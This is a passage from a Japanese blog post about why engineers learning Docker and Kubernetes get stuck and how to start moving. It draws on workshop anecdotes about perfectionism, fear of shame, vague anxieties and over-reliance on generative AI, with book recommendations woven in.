彼を動けなくしているのだと、その姿を見ながら僕は思った。彼は、昔の僕だ。気づけば開始時刻になっていた。けれど彼の画面に立ち上がったコンテナは一つもなくて、代わりにあったのは無数に開かれたタブと、そして不思議なことに「今日は勉強した」という、根拠はどこにもないのにどこか心地よい、温かくて柔らかい達成感だけだった。手は動かしていないのに、頭は働かせた気がして、何も作っていないのに、何かを学んだ気がして、この感覚はとても甘くて危険で、僕も何度もこの甘い罠に捕まってきたから分かる。僕も石橋を叩いて渡るタイプで、新しい技術を学ぶときはまず本を買って安心する。「準備してから」「もう少し理解してから」「完璧になってから」、その言葉は、とても合理的に聞こえる、誰も反論できない、自分自身も反論できない、だから安心してその言葉に逃げ込むことができる。でも、ある時気づいてしまった。「まだ準備が足りない」と思って読み続けるうちに、何時間も、何日も経っていて、僕は実際には何一つ手を動かしていなかったことに。本当は、もっと早く気づいていたのかもしれない。けれど気づかないふりをして、気づきたくなくて、「準備」という名の停滞を「努力」だと自分に言い聞かせていた。「明日からやろう」という言葉の背後で何が起きているのか、本人は意外と気づいていない。いや、もしかしたら気づいているのかもしれないけれど、気づかないふりをしているのかもしれないし、気づいていることに気づかないふりをしているのかもしれない。このポストは動けない人の構造を解剖し、そこから抜け出すための実践について書いたもので、三年間ワークショップで自分や多くの若手エンジニアと向き合う中で見えてきたことがある。動けない理由は一見バラバラに見える、けれどこれらの言葉を一つ一つ丁寧に剥いでいくと、驚くほど似た構造が現れる。恥への恐怖、完璧主義、そして「才能がない」という誰も反論できない便利な逃げ道。面白いことに、これらの根底には共通するものがあって、それは「なんとなく不安」「どうも気が進まない」「なんか怖い」という、この「なんか」という輪郭を持たない曖昧な言葉で、僕らはこの「なんか」という便利な言葉の中に、言葉にしたくない、言葉にするのが怖い、言葉にしてしまったら向き合わなければならなくなる、そういう感情を全部押し込めて蓋をしている。この「なんか」を言葉にしない限り、恐怖は形を持たない。形を持たない恐怖は霧のように僕らの思考を覆って、じわじわと、気づかないうちに、判断力を奪い続ける。ここで一つ断っておきたいのは、僕の「なんか」とあなたの「なんか」は、きっと少し違うということで、僕が恐れているものとあなたが恐れているものは同じではないかもしれないし、僕が「恥」だと感じるものとあなたが「恥」だと感じるものは、同じ言葉を使っていても中身は違うのかもしれない。けれど、それでも共通しているのは、その「なんか」を言葉にしないまま放置していることで、言葉にしない限り、それが何であれ、形を持たないまま僕らの中で勝手に膨らんでいくということだ。だから本人も周りもなかなか気づかないまま、「準備している」「慎重なだけ」「向いていないのかも」という、どこか優しげに聞こえて、誰も否定できない言葉の裏側で、実は何ヶ月も何年も同じ場所に立ち止まっていて、立ち止まっていることにすら気づかないまま時間だけが過ぎていく。さらに現代という時代が、この自己欺瞞を加速させている。生成AIに聞けばそれっぽい答えがすぐ返ってきて「理解した気」になれるし、スマホを開けば無限に刺激があって「ちょっと休憩」が気づけば一時間になる。立ち止まっている自分を見て見ぬふりをするための道具が、これほど揃っている時代はない。けれど同時に、この構造を理解すれば抜け出す方法も見えてくる。言語化すること、小さく始めること、遊ぶこと、不完全でも動くこと。これらは全て才能ではなく訓練可能な技術で、動けない理由を言語化できれば、動くための方法も見えてくる。「なんか不安」と思ったとき、立ち止まって「何が不安なのか」と問いかけるようになった。その答えを、怖くても、恥ずかしくても、認めたくなくても、言葉にするようになった。そうすると不思議なことに動けるようになって、言葉にしてしまえば思ったより大したことなかったりして、「こんなことで止まっていたのか」と拍子抜けするほどで、でも、言葉にしない限り、その「こんなこと」は永遠に巨大な壁であり続ける。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。三つの声いろんな彼というか昔の僕から動けない理由を聞くと、大きく三つのパターンに分かれる。正確には、休憩時間や終了後に雑談をしていて「今日はどうだった？」と聞くと、こんな答えが返ってくる。「失敗したくない」という声がある。ワークショップである学生が「エラーが出たら、どうしていいか分からなくなるんです」と言った。その時は「エラーメッセージを読むといいよ」とアドバイスして終わったのだが、後になって考えた。彼が本当に恐れていたのはエラーそのものだったのだろうか。よく思い返してみると、彼は他の参加者を横目で見ていて「みんな進んでる」とも言っていた。つまり、エラーが出たときにそれを解決できない自分が露呈するのが怖かったのではないか。「このエラーの意味が分からない」「基礎的な知識が足りない」と認めることは、自分の無知を他者に見せることになる。他の参加者は解決できているかもしれないし、講師は当然知っている。その中で自分だけが分からない。失敗への恐怖は、実は無知の露呈への恐怖なのかもしれない。エラーそのものは怖くないが、エラーを通じて自分の能力の限界が可視化されることが怖い。だからエラーが出る前に完璧に準備しようとしてドキュメントを読み漁るが、どれだけ読んでも「完璧」には到達しない。そして永遠に始められない。「もっと良い方法があるはず」という声もある。別の学生は「このやり方で合っているのか分からなくて」と言った。その時の彼の画面を覗き込むと、Dockerfileが半分書きかけのまま止まっていた。「どうしたの？」と聞くと「ベストプラクティスを調べてて」と言い、ブラウザには10個以上のタブが開いていた。終わった後、もう少し話を聞いてみた。「何が一番困った？」「うーん、正解が分からなくて」。その「正解」という言葉が引っかかった。プログラミングに唯一の正解なんてあるだろうか。後で考えてみると、彼が求めていたのは「正解」ではなく「間違っていないという保証」だったのかもしれない。Dockerfileを書き始めて一行書いては止まり、「これは本当にベストプラクティスなのか」とブラウザに戻って「Docker ベストプラクティス」で検索する。いくつかの記事を読むと別のやり方が紹介されていて「どっちが正しいんだろう」とまた別の記事を読み、さらに別のやり方を見つける。最適解を求めるほど選択肢は増え、決断は遠のく。でもよく考えてみると、おかしなことを言っている。「最適解」は実際にやってみないと分からず、プロジェクトの要件やチームの習熟度、運用の制約といった文脈によって「最適」は変わる。にもかかわらず文脈なしで「最適解」を求めている。これは実は決断を先延ばしにするための言い訳なのかもしれない。なぜ決断を先延ばしにするのか。おそらく決断には責任が伴うからだ。「これで行く」と決めた瞬間、それが間違っていたときの責任を負うことになる。でも「まだ調べている」段階なら責任は発生せず、間違える可能性もなく、評価されることもない。完璧主義は行動の質の問題ではなく、存在の先延ばしの問題なのかもしれない。「周りの目が気になって」という声は、終わった後の雑談で最も正直に語られた。「質問すると『こんなことも知らないのか』と思われそうで」という学生は、ワークショップ中に何度もつまずいていて画面を見れば分かるのだが、質問もせず隣の人に聞くこともせずに、ただ黙って画面を見つめていた。「どうして質問しなかったの？」と聞くと、「みんな分かってそうな雰囲気で、自分だけ分かってないって思われたくなくて」と言った。でも実際には、後で他の参加者に聞いてみると同じところでつまずいていた人が何人もいたのだが、誰も質問しなかった。みんな同じことを思っていた。恥という感情の不思議なところは、実際の他者の反応ではなく想像上の他者の視線に縛られることだ。「こう思われるかもしれない」という想像がその行動を止めるが、その想像が現実と一致しているかは確かめられない。なぜなら行動していないから。三つの声の正体失敗したくない、もっと良い方法があるはず、周りの目が気になる。学生たちから聞いたこれらの言葉を一人になってから反芻していた。一見バラバラに見えるこれらの理由だが、丁寧に分解していくと共通した構造が見えてくる気がした。すべて恥への恐怖に行き着くのではないか。「失敗したくない」は無知を露呈したくない、つまり恥をかきたくないということであり、「もっと良い方法があるはず」は間違った選択の責任を負いたくない、つまりこれも恥の回避だ。「周りの目が気になる」はそのものズバリ、他者の視線という恥の源泉である。そしてさらに抽象化すると、三つの根源的な恐怖に還元される気がした。恥をかきたくない、損をしたくない、嫌われたくない。でも面白いことに、これらを具体的に言葉にした瞬間、その恐怖は不思議なほど小さく見える。「エラーメッセージの意味が分からないのが怖い」と言葉にすればそれは解決可能な課題になるし、「ベストプラクティスを知らないのが不安」と認めれば「じゃあまず動くものを作って後で改善しよう」という選択肢が見える。「質問して笑われるのが怖い」と明確にすれば、「実際に笑う人がいるのか？ いたとしてその人の評価を気にする必要があるのか？」と問い直せる。具体的に言葉にした瞬間、恐怖は相対化される。でも多くの人はこの言語化の一歩手前で止まっている。いくつになっても恥をかける人になる【DL特典 恥克服ワークシート】作者:中川諒ディスカヴァー・トゥエンティワンAmazon「なんか」の正体「なんとなく不安で」「どうも気が進まなくて」「なんか怖くて」。この「なんか」という言葉が問題だ。「なんか」で済ませている限り恐怖は輪郭を持たない。輪郭を持たない恐怖は無限の可能性として脅威を放ち続け、それは霧のように思考空間を覆って判断力を奪う。逆に言えば、恐怖を明瞭に言語化すればそれは相対化可能な「ひとつの感情」へと縮小する。言葉は混沌に秩序を与える。でも、なぜ人は言語化を避けるのか。試しに自分が動けない理由を紙に書き出してみるといい。「なぜこのタスクに取り掛かれないのか」を具体的に書き始めると手が止まる。なぜか。言語化とは「嫌な自分」と正面から向き合う行為だから。曖昧なままなら自己欺瞞の余地が残り、「本気出せばできる」「時間がないだけ」「環境が悪いだけ」とそう思い込んでいられる。でも一度言葉にしてしまえばもはや逃げ場はない。「基礎的なことを理解していない」と書けばそれは事実として目の前に現れ、「エラーメッセージを読み飛ばしている」と認めればその怠慢は言い逃れできなくなり、「質問する勇気がない」と言葉にすれば自分の臆病さと向き合わざるを得ない。だから人は言語化を避ける。でもこの回避こそが停滞を生み出す。言葉にできない感情は実体以上に巨大化し、漠然とした不安のまま放置すればそれはどんどん大きくなっていく。「なんとなく怖い」が「とても怖い」になり「絶対に無理」になる。未言語化の不安は輪郭を持たないがゆえに肥大化し、行動を麻痺させる。このポストは動けない人の構造を解剖しそこから抜け出すための実践について書いたものだ。抽象的な話に聞こえるかもしれないが、これは極めて実践的な話だ。なぜなら動けない理由を言語化できれば動くための方法も見えてくるからだ。ワークショップでドキュメントを読み漁る若者を見ながら、自分もかつてそうだったことを思い出す。そして今も新しい技術に触れるとき同じパターンに陥りそうになる。でも一つだけ変わったことがある。「なんか不安」と思ったとき立ち止まって「何が不安なのか」と問いかけるようになった。その答えを言葉にするようになった。そうすると不思議なことに動けるようになる。「なんか」の正体を一緒に言葉にしてみよう。人生のレールを外れる衝動のみつけかた (ちくまプリマー新書)作者:谷川嘉浩筑摩書房Amazonなぜこんなに変わりたいのに行動ができないのか動けない理由を剥いていくとワークショップの後、参加者たちと話していて気づいたことがある。動けない理由は人それぞれ違う言葉で語られるが、その言葉を一つ一つ剥いでいくと意外なほど似た構造が現れる。「失敗したくない」と言った学生に「何が失敗なの？」と聞いてみた。「エラーが出ることです」。「エラーが出ると何が困るの？」「解決できないからです」。「解決できないと何が困るの？」と重ねて聞くと、彼は少し黙って小さな声で言った。「他の人にできないやつだと思われるのが嫌なんです」。ああそうか。エラーが怖いのではなかった。自分で認めるのも嫌だけど、エラーを解決できない自分が他者に見られることが怖かったのだ。「もっと良い方法があるはず」と言った学生には「今のやり方の何が問題なの？」と聞いた。「うーん、間違ってるかもしれないから」。「間違ってると何が困るの？」「後で直すのが大変だから」。「本当にそれだけ？」と聞くと、彼も少し考えてこう言った。「間違ったやり方を選んだって知られたくないです」。ここでも他者の視線が出てきた。試しに動けない理由を「○○が怖い」という形に言い換えてみると、面白いことにだいたい三つに集約される。恥をかくのが怖い、損をするのが怖い、嫌われるのが怖い。これらを観察しているとある構造に気づく。すべての中心に「他者の視線」がある。恥は他者がいて初めて成立し、損も他者との比較で生まれ、嫌われるもそのものズバリ他者との関係だ。動けない理由を突き詰めていくと、思考の主語が「自分」ではなく「他人」になっている。恥という不思議な感情恥を恐れて動けないとき自分の思考を観察してみるといい。面白いことに気づく。思考の主語が「他人」になっている。「自分がどうしたいか」ではなく「他人にどう見られるか」、「これは面白いか」ではなく「これは評価されるか」と、判断基準の中心にいつの間にか他者の視線が居座っている。ワークショップでこんなことがあった。ある学生が自分で考えた実装方法を試そうとしていたが、途中で手を止めて「これ間違ってるかもしれない」と言ってブラウザでベストプラクティスを検索し始めた。「さっきの方法試してみたら？」と声をかけると、「でももし間違ってたら恥ずかしいです」と言った。誰に対して？よく考えてみるとおかしな話だ。ワークショップは学ぶ場所で間違えるために来ているのに、彼は間違えることを恥だと感じていた。恥という感情は本質的に社会的なものだ。一人で山に籠もって生きているなら恥という感情は存在せず、恥は他者の視線があって初めて成立する。だから恥を避けようとすればするほど自分の判断基準は外部に移っていく。「自分はこれを試してみたい」ではなく「これは他者に評価されるか」、「自分はこれが面白い」ではなく「これは正しいと思われるか」となる。これは「外部評価への依存」というきわめて脆弱な存在様式だ。なぜ脆弱なのか。他者の評価はコントロールできないからだ。どれだけ頑張っても他者がどう評価するかは分からず、評価を気にすればするほどその不確実性に振り回される。さらに皮肉なことに恥を避けようとしてもっと深刻な状態に陥る。「失敗」という一時的な出来事を避けようとして「停滞」という持続的な状態に陥る。一瞬の恥を避けるために何ヶ月も何年も同じ場所に立ち止まる。でもこの事実に気づくのはいつも後になってからだ。停滞している最中は自分が停滞していることにすら気づかず、「準備している」「勉強している」「タイミングを見計らっている」とそう言い聞かせながら過ごす。恥を避けることに内的エネルギーを費やすほど自己の内側は空洞化していく。他者の評価を内面化し自分で自分を監視する。自己評価の基準が外部にあるときそこにはもう自己は存在しない。「完璧」という呪い「完璧に準備してから始める」という言葉は合理的に聞こえるが、ワークショップでこの言葉を聞くたびある疑問が浮かぶ。「完璧」って何だろう。ある学生はワークショップ開始前に2時間ドキュメントを読んでいて「準備したい」と言っていたが、実際にコンテナを立ち上げることはなかった。「どこまで準備したら始められそう？」と聞くと「全部理解してから」と言った。全部。でも「全部」って何だろう。Dockerの全ての機能を理解する？ Kubernetesの全てのコンポーネントを理解する？ そんなことは実務で何年も使っているエンジニアでも無理だ。つまり「完璧に準備してから始める」は実質的に「決して始めない」と同義だ。よく考えてみるとおかしなことを言っている。完璧に準備するとは何か。すべてを理解してから始めるということだが、すべてを理解するには実際にやってみるしかなく、やってみないと分からないことは必ずある。ドキュメントに「Podは一つ以上のコンテナを含む」と書いてあれば読めば理解できるが、実際にyamlを書いてkubectl applyしてエラーが出てそのエラーメッセージと格闘して、初めて本当に理解できる。理論的な理解と体験的な理解は違う。「完璧に準備してから」と言う人は実は理論的な理解だけで完璧になれると思っているが、それは不可能だ。体験なしに理解は完成しない。では、なぜ人は「完璧に準備してから」と言うのか。これは行動の質の問題ではなく存在の先延ばしの問題だ。不完全な自分を世界に晒すことへの恐怖、評価されることへの恐怖、そしてその根底にはやはり恥がある。完璧主義は恥への防衛機制として機能し、「準備不足だから失敗した」という言い訳をあらかじめ用意しておく。決して完成しないものは決して評価されず、評価されなければ恥もかかない。求めるほど遠のくという逆説がここにある。完璧を求めるから行動できず、行動しないから経験が積めず、経験がないから完璧からは遠のき、そしてさらに完璧を求める。この悪循環。ワークショップである学生が最後に「結局何も完成しませんでした」と言った。でも彼は多くのことを学んだはずだ。エラーメッセージの読み方、yamlの書き方、kubectlのコマンド。不完全でも多くのことを試した。「完成しなかったけど学んだことはたくさんあったんじゃない？」と言うと少し考えて「そうですね。でも完成させたかったです」と言った。完璧主義者が見落としているのは小さな一歩の価値だ。不完全でも動いた一歩と完璧を求めて動かなかったゼロ。どちらが自分を前に進めるか。答えは明白なのになぜか後者を選んでしまう。不完全主義　限りある人生を上手に過ごす方法作者:オリバー・バークマンかんき出版Amazon言葉にできない不安の正体「なんとなく不安で」「どうも気が進まなくて」「なんか怖くて」という言葉を休憩時間によく聞く。「どうして手を動かさないの？」と聞くと「なんとなく」と返ってくる。この「なんか」「なんとなく」という言葉が実は重要な意味を持っている。試しに「なんとなく不安」と言った学生に「何が不安なの？」と聞いてみた。「うーん、なんか」。「例えば？」「分からないです」。言葉にできない。でもこれは語彙力の問題ではなく言語化を避けているという選択の問題だ。なぜそう思うか。別の機会に同じ学生にもう一度少し角度を変えて聞いてみた。「もし今コンテナを立ち上げようとしたら何が起きると思う？」すると意外なほど具体的な答えが返ってきた。「エラーが出ると思います。そのエラーの意味が分からなくてどうしていいか分からなくなって時間ばかりかかって結局できなくて周りの人に遅れて」。ああ言葉にできるじゃないか。彼は自分の不安を言語化できないのではなく、言語化したくなかっただけだ。なぜか。言葉にできない感情は実体以上に巨大化する。「なんとなく不安」のままならその不安の正体は確定しないが、「エラーの意味が分からないのが怖い」と言葉にした瞬間それは具体的な課題になってしまい、具体的な課題になればそれに対処しなければならなくなる。言語化とは「嫌な自分」と正面から向き合う行為だから。「エラーメッセージの意味が分からない」と認めることは自分の知識不足を認めることであり、「基礎が理解できていない」と言葉にすることは自分の勉強不足を認めることであり、「質問する勇気がない」と明確にすることは自分の臆病さを認めることだ。曖昧なままなら自己欺瞞の余地が残り、「本気出せばできる」「時間がないだけ」「環境が悪いだけ」とそう思い込んでいられるが、一度言葉にしてしまえばもはや逃げ場はない。だから人は言語化を避ける。でもこの回避こそが停滞を生み出す。輪郭を持たない恐怖は無限の可能性として脅威を放ち続ける。それは霧のように思考空間を覆って判断力を奪い、「なんとなく怖い」が「とても怖い」になり「絶対に無理」になる。未言語化の不安は輪郭を持たないがゆえに肥大化し行動を麻痺させる。逆に言えば恐怖を明瞭に言語化すればそれは相対化可能な「ひとつの感情」へと縮小する。「エラーメッセージの意味が分からないのが怖い」と言葉にした瞬間それは解決可能な具体的課題になる。言葉は混沌に秩序を与える。言葉を持つことは自由を獲得することに等しい。言語化は自己認識の解像度を上げる行為であり、内面の混沌を構造化し恐怖を名指すことで相対化する力。それが言語化の力だ。「無理」の構造 ―この世の理不尽さを可視化する作者:細谷 功dZEROAmazon「才能」という最も便利な逃げ道そして最後にすべてを覆い隠す魔法の言葉がある。「才能がない」。ワークショップの最後ある学生が「自分には向いていないかもしれません」と言った。「どうしてそう思うの？」と聞くと「他の人より理解が遅いから」と言った。でも観察していて気づいたことがある。彼は理解が遅いのではなく理解しようとしていなかったのだ。エラーメッセージが出てもちゃんと読んでいなかった。「Expected type X, but got type Y」と明確に書いてあるのに「type X」という文字列だけを拾って、期待される型と実際の型が違うという関係性を読み取っていなかった。ドキュメントを「読んでいる」と言いながら実際には流し読みしていて、主語と述語を把握せず「誰が」「誰に」「何を」しているのかという基本的な構造を理解しないまま「なんとなく」で進めようとしていた。仮説を一つずつ潰すのではなく「ネットワークの問題かもしれない」「データベースの問題かもしれない」と複数の仮説を同時に追いかけてどれも中途半端に確認していた。これは才能の問題ではなくプロセスの問題だ。エラーメッセージをちゃんと読む、仮説を一つずつ潰す、主語と述語を把握する。誰でもできることだ。でもこの「小さなこと」を飛ばしているから「理解が遅い」ように見える。そしてこの事実から目を逸らすために「才能」という言葉を使う。「才能がない」という言葉は根深い自己欺瞞であり最も便利な逃避だ。なぜなら才能という言葉を使った瞬間、人は変化の可能性を放棄できるからだ。「才能がないからできない」は「努力してもどうせ無理」と同義で、成長のための努力そのものが無意味に思える。そして才能という言葉はすべてを覆い隠す。恥への恐怖を覆い隠し完璧主義を正当化し言語化を避ける。基礎プロセスを飛ばしていることも努力を怠っていることもすべて「才能」という一言で片付けられる。才能という言葉を使った瞬間思考は停止する。でも観察していると分かる。「才能がある」ように見える人も実は同じプロセスを踏んでいる。エラーメッセージをちゃんと読み仮説を一つずつ潰し主語と述語を把握している。ただそれだけだ。違いはそのプロセスを意識的に実践しているかどうかであり、それは訓練可能だ。前のポストで書いたように技術力は経験の蓄積とセンスから成り立ち、そしてどちらも訓練可能だ。センスとは突き詰めれば「何に注目するか」という習慣と「それを面白がれるか」という姿勢だ。でも「才能」という言葉を使えばこうした具体的な分析も具体的な対策もすべて放棄できる。恥への恐怖、完璧主義、言語化の欠如。そのすべてを「才能」という一言で説明する。これが動けない人が抱える最後の砦だ。HIDDEN POTENTIAL 可能性の科学――あなたの限界は、まだ先にある (三笠書房　電子書籍)作者:アダム・グラント三笠書房Amazon動くための小さな一歩言葉にしてみるという勇気まず自分の恐怖を具体的に正直に言語化してみる。ワークショップの終わりにこんな提案をしてみた。「今日動けなかった理由を紙に書いてみて」。最初は戸惑った顔をしていた参加者たちだが何人かが書き始めた。ある学生が書いたのは「エラーが出たときに解決方法が分からなくて周りに遅れるのが嫌だった」という文章だった。書き終わって彼はその紙をじっと見ていて「あれこんなことだったのか」と言った。言葉にした瞬間不思議なことが起きる。恐怖が相対化され「ああこんなことで止まっていたのか」という気づきから「じゃあどうすればいいか」という具体的な対策が見えてくる。「エラーが出たときに解決方法が分からない」なら「じゃあエラーメッセージの読み方を学ぼう」となり、「周りに遅れるのが嫌」なら「でもこれは学ぶ場所だ。遅れても構わない」となる。抽象的な不安は具体的な課題へと変換され、具体的な課題は具体的な対策で解決できる。「恥をかきたくない」だけではまだ抽象的だ。もう一歩踏み込んで「このコードをレビューに出したら基礎的な部分の知識不足を指摘されるのが怖い」とここまで具体的にする。すると「じゃあ基礎的な部分を先に学べばいい」という対策が見え、「レビュー前に自分でチェックリストを作ればいい」という方法が浮かび、「そもそも指摘されることは学びのチャンスだ」という視点が得られる。言語化は勇気の技術であり嫌な自分と向き合う技術だが、その一歩がすべてを変える。さみしい夜にはペンを持て作者:古賀史健ポプラ社Amazon現代人が失ったものただ言語化を阻むものは個人の内側だけにあるわけではなく、現代という時代そのものが言語化を難しくしている。ワークショップの休憩時間、参加者たちの多くがスマホを見てTwitterやInstagramをスクロールしLINEに返信しYouTubeのショート動画を見る。私たちは今インスタントで断片的な刺激に取り巻かれている。即座の返信、短い動画、分かりやすい解説とスマホを持つことで即時的な満足にいつでもアクセスでき、「消化しきれなさ」「難しさ」「モヤモヤ」といった時間もコストもかかるものは避けられるようになった。技術ドキュメントを読むことはまさにこの「モヤモヤ」との戦いだ。Kubernetesの公式ドキュメントを開いても一読してすぐに理解できるものではなく、分からない用語が出てきてそれを調べるとさらに分からない概念が出てくる。読み返し実際に試しエラーが出てまた読み返す。この時間のかかるプロセスがインスタント化した感覚に慣れた私たちには耐えがたい。だからすぐに生成AIに「KubernetesのServiceとは何ですか？要約して」と聞く。確かに分かりやすい説明が返ってきてスッキリする。でもその過程で失われるものがある。モヤモヤした状態を抱えたまま読み続け試し続けることでしか到達できない深い理解。断片的な知識ではなく体系的な理解。これは要約では得られない。ある学生がワークショップで「生成AIで調べたんですけど実際にやってみるとうまくいかなくて」と言った。よく見ると生成AIの説明を鵜呑みにしてその背後にある前提条件を理解していなかった。「この設定はこういう環境を前提としています」という部分を読み飛ばしていた。生成AIは便利なツールだが使い方を間違えると理解の機会を奪う。同時にスマホによる常時接続は孤独を奪った。ワークショップ中少し難しい課題に取り組んでいるときすぐにスマホに手が伸びて「ちょっと休憩」と言ってTwitterを開く。退屈に耐えきれず何か刺激を求めてスマホをいじる。一人でドキュメントと向き合う時間一つのことに没頭する孤立。このシンプルな行為が驚くほど難しくなっている。でも言語化には孤独が必要で、自分の内側と向き合うには外部の刺激から離れる必要がある。そしてもう一つ、ネガティブ・ケイパビリティの欠如だ。これは「結論づけずモヤモヤした状態で留めておく能力」のことで、把握しきれない謎をそのまま抱えておく力だ。新しい技術を学ぶときすぐに「わかった」と思いたくなるが実際にはわかっていないことだらけで、この不確実性に耐える力が現代人には欠けている。ワークショップでこんなことを言う学生がいた。「全部理解してから次に進みたいんです」。でも「全部理解する」なんて不可能だ。理解は何度も行ったり来たりしながら螺旋を描くように深まっていく。最初は30%の理解、実際に使ってみて50%、エラーと格闘して70%、また別の文脈で使って80%。理解は一度で完成しない。でもこのモヤモヤした状態に耐えられずすぐに「分かった」と結論づけたいために生成AIに「簡潔に説明して」と頼む。簡潔な説明は確かに分かりやすいが、その分かりやすさは複雑さを削ぎ落とした結果で、削ぎ落とされた部分にこそ本質が隠れていることもある。学びとは何か－〈探究人〉になるために (岩波新書)作者:今井 むつみ岩波書店Amazon生成AIという新たな逃避ChatGPTやClaudeの登場は学習の風景を変えそして新しい逃避の道を開いた。停滞のパターンはこうだ。エラーが出て生成AIに「このエラーどう直す？」と聞き答えが返ってコピペして動いて「解決！」となる。これは答えは得られるが理解は得られず、次に同じエラーに遭遇したときまた同じことを繰り返す。ワークショップで何度も同じパターンを見た。学生がエラーに遭遇してすぐに生成AIに聞き答えをコピペし次のエラーでまた聞きまたコピペする。三回目に同じようなエラーが出たとき彼は気づいていなくて「あれさっきも似たようなエラーが出たな」という記憶がない。なぜか。自分で考えていないからだ。エラーメッセージを読んでいない。なぜそのエラーが出たのか理解しようとしていない。答えは得られるが学びは得られない。混乱したときすぐに生成AIに頼ると不快感と向き合う機会が失われる。でもこの不快感こそが深い理解への道なのに。成長のパターンはこうだ。まず自分で理解しようとしてエラーメッセージを読みドキュメントを読み仮説を立てて試す。それでも分からなかったら自分なりの理解をまとめる。その上で生成AIに「私はこう理解したが合ってる？」と質問する。先に自分で考えて生成AIは「答えを教える」のではなく「理解を確認する」役割にする。あるいは「このエラーが出た。なぜこのエラーが出るのか仕組みから説明して。直し方は教えなくていい」と聞いて表面的な解決策ではなく根本的な理解を得る。ワークショップでこの方法を試した学生がいた。最初は時間がかかったが、三回目に似たようなエラーが出たとき彼は自分で解決できて「ああこれはあの時と同じパターンだ」と言った。理解があれば応用が効く。生成AIとの付き合い方には四つの落とし穴がある。一つ目は思考の外部化で考えるべきことを全て生成AIに任せてしまうこと。二つ目は流暢性の錯覚で、生成AIの説明は分かりやすいが自分でコードを書こうとすると書けず「分かった気」になっているだけ。三つ目は最適な難易度を見失い自分の理解レベルに合わない質問をしてしまい、基礎を理解していないのに応用的な質問をする。四つ目は不快感から逃げることで、混乱したときモヤモヤしたときすぐに頼ってしまうがその不快感こそが成長の証なのに。重要なのは自分の頭で考え手を動かし不快感と向き合うことで、これは生成AIがなかった時代もある時代も変わらない真実だ。そしてこれも才能の問題ではなく習慣の問題だ。生成AI「戦力化」の教科書作者:松本 勇気日経BPAmazon遊ぶことから始まる恥を恐れ完璧を求め言語化から逃げる。この三つが絡み合って人を動けなくする。一つの答えは遊ぶことだ。ワークショップでこんな提案をしてみた。「次の30分何も見ずにとりあえず動かしてみて」。「えっドキュメント見なくていいんですか？」と驚く学生たちに「いいよ。適当にやってみて。エラーが出ても気にしない。とにかく何か動かしてみる」と答えた。最初は戸惑っていたが徐々に表情が変わってきて「あこれ動いた」「このオプション何だろう」「試してみよう」となった。遊びには「正解」がないから失敗を恐れる必要がない。評価されることもなくただ面白いからやり好奇心のままに試す。この心理的な自由が試行錯誤を促進する。30分後何人かの学生が予想外のものを作っていた。「Nginxのコンテナを3つ立ち上げてそれぞれ違うページを表示させてみました」。ドキュメント通りではないが動いていて彼は楽しそうだった。「どうやって作ったの？」と聞くと「分からないままとりあえず書いてみたら動いたんです」と言った。この「なんとなく」が実は重要なのだ。理論を学ぶ前に体験を通じた直感的理解が生まれる。後に理論を学ぶとき「あああの時の『なんとなく』はこういうことだったのか」と腑に落ちる。プログラミングを学び始めた頃を思い出してほしい。「とりあえず動かしてみよう」と思ってよくわからないままコードを書いた経験はないだろうか。エラーが出て何が悪いのかわからないが、いろいろいじっているうちになんとなく動いた。遊びは内発的動機を育てる。「やらなければならない」ではなく「やりたい」という動機で、これは強制では生まれない。自分で選んで自分のペースで面白いと思うことをやる過程で内発的動機が育つ。失敗への耐性も生まれる。遊んでいるとき失敗は「失敗」ではなくただの「結果」だ。「あこうするとこうなるんだ」という発見と次は別の方法を試してみようという好奇心。多くの人は学びを始めるときいきなり「正しいやり方」を覚えようとして教科書を読みチュートリアルを見る。でもこれは実は難しい。なぜなら「なぜその型が重要なのか」がわからないまま形だけを真似ようとするから。型の意味を理解するにはその型がない状態を経験する必要がある。だからまず遊ぶ。制約なく好奇心のままに試して失敗を恐れず楽しむ。ここで少し逆説的なことを言いたい。特に若い時期には根拠がなくても自分を信じることが重要だ。「これが本当に正しい道なのか」「自分に向いているのか」。そんな冷静な自己分析ばかりしていると一歩も踏み出せなくなる。時には根拠のない自信を持って盲信的に突き進むことも必要だ。「Kubernetesなんて簡単だろう」というある意味で無知ゆえの大胆さ。この「若気の至り」とも言える姿勢が最初の一歩を踏み出させてくれる。ワークショップで最も早く理解した学生に「なんでそんなに迷わず進めるの？」と聞いてみた。彼は少し考えて「分からないけどとりあえずやってみたら分かるかなって」と言った。根拠のない自信だがその自信が彼を動かした。実際に動いた結果本当に理解した。その盲信的な姿勢がいつか本当の自信に変わり、根拠のない自信が実績という根拠を伴った自信になる。気づけば最初は「嘘」だった「自分はできる」という言葉が本当になっている。完璧主義を捨ててまず遊ぶ。型を学ぶのはその後でいい。熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon小さく、完璧でなくても、動く停滞と努力の違いを理解することも重要だ。ワークショップである学生がKubernetesのServiceの概念に数日苦しんでいて、彼は毎日同じドキュメントを読み返していた。「努力している」と本人は言ったが彼は前に進んでいなかった。よく話を聞くと彼はそもそもネットワークの基礎を理解していなかった。IPアドレスとは何かポートとは何かDNSがどう動くのか。こうした土台がないままKubernetesの抽象的な概念を理解しようとしていた。難しい問題に直面したとき人は二つの道を選ぶ。一つは理解できないまま同じ説明を何度も読み返し同じ場所でぐるぐると回り続けること。もう一つは「何が分からないのか」を見極めてまずそこから順番に理解していくこと。前者を停滞と呼び後者を努力と呼ぶ。停滞している人はしばしば自分が努力していると思っている。長時間向き合い何度も試している。でも実際には前提となる知識が欠けたまま同じところで足踏みを繰り返しているだけ。「Serviceが分からない」と言っていた学生に「じゃあまずネットワークの基礎から学ぼう」と提案すると最初は不満そうで「それは遠回りじゃないですか」と言った。でも基礎から学び始めて3日後彼は突然Serviceを理解して「ああそういうことか！」と言った。本当の意味での努力とは今の自分が理解できるところから始めること。Kubernetesが難しいならまずネットワークの基礎から。ネットワークが難しいならまず自分のPCで2つのプログラムを通信させることから。この段階を踏んだ学び方こそが努力の本質だ。学習には三つのゾーンがある。コンフォートゾーンはすでに理解していることを繰り返す状態で簡単すぎて新しい学びがない。パニックゾーンは現在の理解からかけ離れていて難しすぎて何から手をつければいいかわからない。学習ゾーンは少し難しいが頑張れば手が届き既存の知識を応用すればなんとか理解できる。「才能がない」と感じているとき実はパニックゾーンに突っ込んでいるだけかもしれない。基礎を理解していないのに応用に挑戦し前提知識がないのに高度な概念を理解しようとする。当たり前だがこれは無理だ。才能の問題ではなく順序の問題だ。不快感を恐れないことも重要だ。学習において最も反直感的な真実の一つはある種の困難は実は学習を改善するということだ。同じチュートリアルの